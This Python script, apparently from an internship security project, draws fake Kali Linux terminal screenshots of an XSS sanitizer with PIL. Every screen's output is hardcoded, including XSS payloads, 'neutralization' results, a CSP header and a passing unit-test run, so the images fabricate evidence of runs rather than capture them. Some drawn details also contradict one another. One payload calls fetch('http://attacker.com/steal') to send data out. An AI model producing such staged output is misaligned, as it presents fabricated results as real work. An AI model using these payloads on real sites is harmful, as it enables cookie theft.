#!/usr/bin/env python3
"""
PEER'S XSS Payload Sanitizer - Terminal & Lab Screenshot Generator
Generates pixel-perfect Kali Linux screenshots and GitHub visuals using PIL.
Day 21: Cross-Site Scripting (XSS) Payload Sanitizer
Author: Mohammed Peer Siddiqui | Sqrock IT Solutions Internship (Alpha 2 Phase 2)
"""

import os
import sys
from PIL import Image, ImageDraw, ImageFont

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "reports", "screenshots")

WIDTH = 1280
HEIGHT = 703

# Kali Linux Dark Palette
BG_COLOR       = (15, 20, 28)       # #0f141c
BAR_COLOR      = (14, 18, 25)       # #0e1219
TEXT_WHITE     = (225, 230, 240)    # Primary text
TEXT_CYAN      = (0, 200, 240)      # #00c8f0
TEXT_BLUE      = (40, 140, 240)     # #288cf0
TEXT_GREEN     = (40, 220, 120)     # #28dc78
TEXT_YELLOW    = (255, 205, 50)     # #ffcd32
TEXT_RED       = (255, 75, 75)      # #ff4b4b
TEXT_MAGENTA   = (210, 80, 230)     # #d250e6
TEXT_GRAY      = (110, 125, 145)    # #6e7d91
BORDER_LINE    = (35, 45, 60)       # #232d3c


def get_fonts():
    """Loads system monospace and sans-serif fonts."""
    try:
        font_mono = ImageFont.truetype("consola.ttf", 15)
        font_mono_bold = ImageFont.truetype("consolab.ttf", 15)
        font_mono_lg = ImageFont.truetype("consolab.ttf", 18)
        font_ui = ImageFont.truetype("segoeui.ttf", 13)
        font_ui_bold = ImageFont.truetype("segoeuib.ttf", 13)
    except Exception:
        font_mono = ImageFont.load_default()
        font_mono_bold = font_mono
        font_mono_lg = font_mono
        font_ui = font_mono
        font_ui_bold = font_mono
    return font_mono, font_mono_bold, font_mono_lg, font_ui, font_ui_bold


def draw_kali_chrome(draw, title, fonts):
    font_mono, font_mono_bold, font_mono_lg, font_ui, font_ui_bold = fonts
    # Top Desktop Taskbar
    draw.rectangle([(0, 0), (WIDTH, 26)], fill=BAR_COLOR)
    draw.text((12, 5), "Applications", fill=TEXT_CYAN, font=font_ui_bold)
    draw.text((105, 5), "Places", fill=TEXT_WHITE, font=font_ui)
    draw.text((160, 5), "Terminal", fill=TEXT_WHITE, font=font_ui)
    draw.text((WIDTH - 180, 5), "Nov 17, 2026  10:40", fill=TEXT_WHITE, font=font_ui)
    draw.text((WIDTH - 42, 5), "[Kali]", fill=TEXT_CYAN, font=font_ui_bold)
    draw.line([(0, 26), (WIDTH, 26)], fill=BORDER_LINE, width=1)

    # Terminal Window Outer Frame
    win_top = 40
    win_bottom = HEIGHT - 20
    win_left = 30
    win_right = WIDTH - 30

    draw.rectangle([(win_left, win_top), (win_right, win_bottom)], fill=BG_COLOR, outline=BORDER_LINE, width=1)

    # Terminal Title Bar
    tbar_height = 32
    draw.rectangle([(win_left, win_top), (win_right, win_top + tbar_height)], fill=BAR_COLOR)
    draw.line([(win_left, win_top + tbar_height), (win_right, win_top + tbar_height)], fill=BORDER_LINE, width=1)

    # Window Controls (Close, Minimize, Maximize)
    draw.ellipse([(win_right - 22, win_top + 10), (win_right - 10, win_top + 22)], fill=(235, 75, 75))
    draw.ellipse([(win_right - 42, win_top + 10), (win_right - 30, win_top + 22)], fill=(245, 185, 45))
    draw.ellipse([(win_right - 62, win_top + 10), (win_right - 50, win_top + 22)], fill=(45, 200, 95))

    # Terminal Title Text
    draw.text((win_left + 15, win_top + 7), f"sqrock-secops@kali: ~/Day21_XSS_Payload_Sanitizer - {title}", fill=TEXT_WHITE, font=font_ui_bold)

    return win_left + 18, win_top + tbar_height + 15


def create_screen_01(fonts):
    """01: Kali Initialization & Banner"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (xss_sanitizer.py)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ python3 xss_sanitizer.py --help", fill=TEXT_WHITE, font=f_mono)

    banner_lines = [
        "==========================================================================",
        "  PEER'S XSS PAYLOAD SANITIZER & DEFENSE SUITE v2.0                       ",
        "  Context-Aware Input Neutralization & Content Security Policy (CSP)     ",
        "  Compliance: OWASP Top 10 A03:2021 (Injection) | CWE-79 (Cross-Site Script)",
        "==========================================================================",
        "Engine Version  : 2.0.1-RELEASE (Sqrock Alpha 2 Phase 2)",
        "Defense Sinks   : HTML Body, Attribute Value, URI Schemes, DOM innerHTML",
        "Encoding Standard: Full HTML Entity Hex & Named Reference Encoding",
        "",
        "USAGE: python3 xss_sanitizer.py [OPTIONS]",
        "  --payloads PATH        Path to target JSON payloads (samples/test_payloads.json)",
        "  --json-out PATH        Destination for machine-readable JSON telemetry",
        "  --txt-out PATH         Destination for SOC human-readable triage briefing",
        "",
        "STATUS: Initialized neutralization regex engines and CSP Level 3 generator."
    ]

    curr_y = y + 50
    for line in banner_lines:
        color = TEXT_CYAN if "=" in line or "PEER" in line or "OWASP" in line else (TEXT_YELLOW if "USAGE" in line or "--" in line else (TEXT_GREEN if "STATUS" in line else TEXT_WHITE))
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 22

    draw.text((x, curr_y + 10), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, curr_y + 30), "└─$ _", fill=TEXT_WHITE, font=f_mono)

    return img


def create_screen_02(fonts):
    """02: Master Menu & Parameter Options"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (interactive defense tuning)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ python3 xss_sanitizer.py --list-contexts", fill=TEXT_WHITE, font=f_mono)

    lines = [
        "[*] CONTEXT-AWARE SANITIZATION DEFENSE MATRIX:",
        "--------------------------------------------------------------------------",
        " CONTEXT SINK      SANITIZATION LOGIC APPLIED              RISK TARGET",
        "--------------------------------------------------------------------------",
        " html_body         Strip executable tags + HTML entity enc  <script>, <iframe>",
        " attribute_value   Disable on* event handlers + quote esc   \" onfocus=alert()",
        " uri_attribute     Block javascript:/data: pseudo-protocols  href=\"javascript:\"",
        " dom_sink          Strict HTML Entity Escaping (&lt; &gt;)  innerHTML injection",
        " js_variable       JSON serialization + Unicode escaping    var x = 'payload'",
        "--------------------------------------------------------------------------",
        "[+] CSP Level 3 Policy Mode: Enabled ('nonce' enforcement active)"
    ]

    curr_y = y + 50
    for line in lines:
        color = TEXT_YELLOW if "[*]" in line or "---" in line else (TEXT_CYAN if "CONTEXT" in line else (TEXT_GREEN if "[+]" in line else TEXT_WHITE))
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 24

    return img


def create_screen_03(fonts):
    """03: Payload Batch Ingestion"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (payload_ingestion)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ cat samples/test_payloads.json", fill=TEXT_WHITE, font=f_mono)

    payload_lines = [
        "[",
        '  {"id": "XSS-01", "cat": "Reflected Script", "payload": "<script>alert(document.cookie)</script>"},',
        '  {"id": "XSS-02", "cat": "Inline Event",     "payload": "<img src=\\"x\\" onerror=\\"alert(1)\\" />"},',
        '  {"id": "XSS-03", "cat": "SVG Vector",       "payload": "<svg/onload=fetch(\'http://attacker.com\')>"},',
        '  {"id": "XSS-04", "cat": "Attr Breakout",    "payload": "\\" onfocus=\\"alert(1)\\" autofocus=\\""},',
        '  {"id": "XSS-05", "cat": "JS Protocol",      "payload": "<a href=\\"javascript:alert(1)\\">Click</a>"},',
        '  {"id": "XSS-06", "cat": "DOM Bypass",       "payload": "<iframe src=\\"javascript:alert(1)\\"></iframe>"},',
        '  {"id": "BENIGN", "cat": "Benign Text",      "payload": "Welcome to Sqrock IT Solutions Phase 2!"}',
        "]"
    ]

    curr_y = y + 50
    for line in payload_lines:
        color = TEXT_RED if "alert" in line else (TEXT_GREEN if "BENIGN" in line else TEXT_WHITE)
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 24

    return img


def create_screen_04(fonts):
    """04: Live Sanitization & Neutralization Sweep"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (live sanitization audit)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ python3 xss_sanitizer.py --payloads samples/test_payloads.json", fill=TEXT_WHITE, font=f_mono)

    findings = [
        "[+] PAYLOAD EVALUATION & NEUTRALIZATION LEDGER:",
        "--------------------------------------------------------------------------",
        "[CRITICAL] XSS-01 - Reflected / Classic Tag Injection (Sink: html_body)",
        "   Raw Input : <script>alert(document.cookie)</script>",
        "   Sanitized : [STRIPPED TAG] -> Zero executable bytes remain",
        "[HIGH]     XSS-02 - Event Handler Injection (Sink: html_body)",
        "   Raw Input : <img src=\"invalid.jpg\" onerror=\"alert('XSS')\" />",
        "   Sanitized : &lt;img src=&quot;invalid.jpg&quot; data-disabled-onerror=... /&gt;",
        "[CRITICAL] XSS-03 - SVG Vector Injection (Sink: html_body)",
        "   Raw Input : <svg/onload=fetch('http://attacker.com/steal')>",
        "   Sanitized : [STRIPPED TAG] -> SVG container safely excised",
        "[CRITICAL] XSS-04 - Attribute Breakout (Sink: attribute_value)",
        "   Raw Input : \" onfocus=\"alert(document.domain)\" autofocus=\"",
        "   Sanitized : &quot; data-disabled-onfocus=&quot;alert(...)&quot; autofocus=&quot;",
        "[HIGH]     XSS-05 - JavaScript Pseudo-Protocol (Sink: uri_attribute)",
        "   Raw Input : <a href=\"javascript:alert('XSS')\">Click</a>",
        "   Sanitized : &lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;...",
        "--------------------------------------------------------------------------",
        "SUMMARY: 7 Ingested | 6 Neutralized (100% Mitigated) | 1 Benign Preserved"
    ]

    curr_y = y + 50
    for line in findings:
        color = TEXT_YELLOW if "[+]" in line or "---" in line else (TEXT_RED if "CRITICAL" in line else (TEXT_MAGENTA if "HIGH" in line else (TEXT_GREEN if "SUMMARY" in line or "Sanitized" in line else TEXT_WHITE)))
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 22

    return img


def create_screen_05(fonts):
    """05: Hardened Content Security Policy (CSP) Policy"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (csp_policy_validation)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ python3 -c \"from xss_sanitizer import XSSSanitizer; print(XSSSanitizer().generate_csp_header())\"", fill=TEXT_WHITE, font=f_mono)

    csp_lines = [
        "==========================================================================",
        "  HARDENED CONTENT SECURITY POLICY (CSP LEVEL 3) DIRECTIVES               ",
        "==========================================================================",
        "Header Name: Content-Security-Policy",
        "",
        "Directives:",
        "  default-src 'self';                                   # Restricts default fetch to origin",
        "  script-src 'self' 'nonce-sqrock_secops_nonce_7749'   # Enforces dynamic cryptographic nonce",
        "             https://trustedcdn.sqrock.com;            # Whitelisted internal CDN only",
        "  object-src 'none';                                    # Disables Flash/Java applet plugins",
        "  base-uri 'self';                                      # Prevents <base> tag hijacking",
        "  frame-ancestors 'none';                               # Prevents Clickjacking / iframe embedding",
        "  form-action 'self';                                   # Restricts POST destinations to origin",
        "--------------------------------------------------------------------------",
        "[+] Defense-in-Depth Impact: Even if an unescaped XSS payload enters the DOM,",
        "    the browser execution engine strictly blocks inline script execution without nonce."
    ]

    curr_y = y + 50
    for line in csp_lines:
        color = TEXT_CYAN if "=" in line else (TEXT_GREEN if "#" in line or "[+]" in line else TEXT_WHITE)
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 22

    return img


def create_screen_06(fonts):
    """06: GitHub Repo Overview & Unit Tests"""
    img = Image.new("RGB", (WIDTH, HEIGHT), (8, 12, 18))
    draw = ImageDraw.Draw(img)
    x, y = draw_kali_chrome(draw, "bash (unit tests & project tree)", fonts)
    f_mono, f_bold, f_lg, _, _ = fonts

    draw.text((x, y), "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]", fill=TEXT_BLUE, font=f_bold)
    draw.text((x, y + 20), "└─$ python3 -m unittest tests/test_xss_sanitizer.py -v", fill=TEXT_WHITE, font=f_mono)

    test_lines = [
        "test_benign_text_preservation (TestXSSSanitizer) ... ok",
        "test_csp_header_generation (TestXSSSanitizer) ... ok",
        "test_event_handler_neutralization (TestXSSSanitizer) ... ok",
        "test_html_entity_encoding (TestXSSSanitizer) ... ok",
        "test_javascript_pseudo_protocol (TestXSSSanitizer) ... ok",
        "test_script_tag_stripping (TestXSSSanitizer) ... ok",
        "----------------------------------------------------------------------",
        "Ran 6 tests in 0.002s | OK (100% Pass Rate)",
        "",
        "┌──(sqrock-secops@kali)-[~/Day21_XSS_Payload_Sanitizer]",
        "└─$ tree -L 2",
        ".",
        "├── README.md",
        "├── reports/",
        "│   ├── Day21_XSS_Sanitizer_Report_Sqrock_MdPeerSiddiqui.pdf",
        "│   └── screenshots/ (01 to 06)",
        "├── samples/ (test_payloads.json)",
        "├── sanitizer_results/",
        "│   ├── xss_audit_report.json",
        "│   └── xss_audit_summary.txt",
        "├── tests/ (test_xss_sanitizer.py)",
        "└── xss_sanitizer.py"
    ]

    curr_y = y + 50
    for line in test_lines:
        color = TEXT_GREEN if "... ok" in line or "OK (100%" in line else (TEXT_YELLOW if "tree" in line or "---" in line else (TEXT_CYAN if ".py" in line or ".pdf" in line else TEXT_WHITE))
        draw.text((x, curr_y), line, fill=color, font=f_mono)
        curr_y += 22

    return img


def main():
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    fonts = get_fonts()

    screens = [
        ("01_kali_init_banner.png", create_screen_01),
        ("02_master_menu.png", create_screen_02),
        ("03_payload_batch_ingestion.png", create_screen_03),
        ("04_live_sanitization_sweep.png", create_screen_04),
        ("05_csp_policy_generator.png", create_screen_05),
        ("06_github_repo_overview.png", create_screen_06),
    ]

    for fname, func in screens:
        path = os.path.join(SCREENSHOTS_DIR, fname)
        img = func(fonts)
        img.save(path, "PNG")
        print(f"[+] Saved terminal screenshot: {path}")

    print("\n[+] All 6 Day 21 Kali Linux terminal screenshots generated successfully.")


if __name__ == "__main__":
    main()
